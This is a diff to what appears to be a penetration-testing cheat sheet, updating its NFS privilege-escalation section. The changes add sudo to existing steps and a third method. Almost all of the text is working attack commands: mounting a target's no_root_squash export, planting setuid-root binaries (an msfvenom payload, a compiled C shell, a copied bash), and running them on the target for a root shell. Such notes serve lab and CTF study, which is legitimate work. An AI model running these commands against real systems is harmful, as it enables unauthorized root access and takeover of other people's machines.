@@ -344,26 +344,36 @@ gcc /tmp/40838.c -pthread -o /tmp/exploit # target machine
 ## NFS ✅
 ```bash
 cat /etc/exports
-# From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
+# From the output, notice that (no_root_squash) option is defined for the "/tmp" export.
 ```
 ### Root-Squashing (1) ✡️
 ```bash
-cat /etc/exports # target machine
+cat /etc/exports # target machine (no_root_squash)
 mkdir /tmp/nfs # our kali
-mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # our kali
-msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # our kali
-chmod +xs /tmp/nfs/shell.elf # our kali
+sudo mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # our kali
+sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # our kali
+sudo chmod +xs /tmp/nfs/shell.elf # our kali
 /tmp/shell.elf # target machine
 ```
 ### Root-Squashing (2) ✡️
 ```bash
 showmount -e 10.10.10.10 # our kali
 mkdir /tmp/nfs # our kali
-mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs # our kali
+sudo mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs # our kali
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c # our kali
-gcc /tmp/nfs/shell.c -o /tmp/nfs/shell # our kali 
-chmod +xs /tmp/nfs/shell # our kali OR target machine
+sudo gcc /tmp/nfs/shell.c -o /tmp/nfs/shell # our kali 
+sudo chmod +xs /tmp/nfs/shell # our kali OR target machine
 /tmp/shell # target machine
+```
+### Root-Squashing (3) ✡️
+```bash
+cat /etc/exports # target machine (no_root_squash)
+cp /bin/bash /tmp/bash # target machine
+mkdir /tmp/nfs # our kali
+sudo mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # our kali
+sudo chown root:root /tmp/nfs/bash # our kali
+sudo chmod +xs /tmp/nfs/bash # our kali
+/tmp/bash -ip # target machine
 ```
 
 
